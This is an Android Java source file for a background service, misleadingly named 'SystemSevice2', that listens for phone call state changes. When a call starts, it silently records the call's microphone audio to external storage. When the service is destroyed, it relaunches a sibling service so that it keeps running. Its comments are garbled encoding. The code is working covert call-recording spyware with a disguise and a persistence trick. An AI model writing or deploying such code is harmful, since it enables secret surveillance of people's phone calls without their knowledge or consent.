package com.zhangbz.phonelistener;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class SystemSevice2 extends Service {
	//�绰������
	private TelephonyManager tm;
	//����������
	private MyListener listener;
	//����¼����
	private MediaRecorder mediaRecorder;
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	//���񴴽���ʱ����õķ���
	@Override
	public void onCreate() {
		//��̨�����绰�ĺ���״̬
		//�õ��绰������
		tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		listener = new MyListener();
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
		super.onCreate();
	}
	
    //�������ٵ�ʱ����õķ���
	@Override
	public void onDestroy() {
		super.onDestroy();
		//ȡ���绰����
		tm.listen(listener, PhoneStateListener.LISTEN_NONE);
		listener = null;
		Intent i = new Intent(this, SystemSevice.class);
		startService(i);
	}
	private class MyListener extends PhoneStateListener {
		//���绰�ĺ���״̬�����仯��ʱ����õķ���
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			// TODO Auto-generated method stub
			super.onCallStateChanged(state, incomingNumber);
			System.out.println("�绰״̬�����仯�ˡ�" + state);
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_IDLE: //����״̬
					if(mediaRecorder != null) {
						//8.ֹͣ����
						mediaRecorder.stop();
						//9.�ͷ���Դ
						mediaRecorder.release();
						mediaRecorder = null;
						System.out.println("¼����ϣ��ϴ��ļ�����������");
					}
					break;

				case TelephonyManager.CALL_STATE_RINGING://����״̬
					
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK://ͨ��״̬
					//��ʼ¼��
					//1.ʵ����һ��¼����
					mediaRecorder = new MediaRecorder();
					//2.�ƶ�¼����������Դ
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					//3.����¼�Ƶ��ļ�����ĸ�ʽ
					mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
					//4.ָ��¼���ļ�������
					File file = new File(Environment.getExternalStorageDirectory(),System.currentTimeMillis() + ".3gp");
					mediaRecorder.setOutputFile(file.getAbsolutePath());
					//5.������Ƶ�ı���
					mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
					//6.׼����ʼ¼��
					mediaRecorder.prepare();
					//7.��ʼ¼��
					mediaRecorder.start();
					break;
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

}
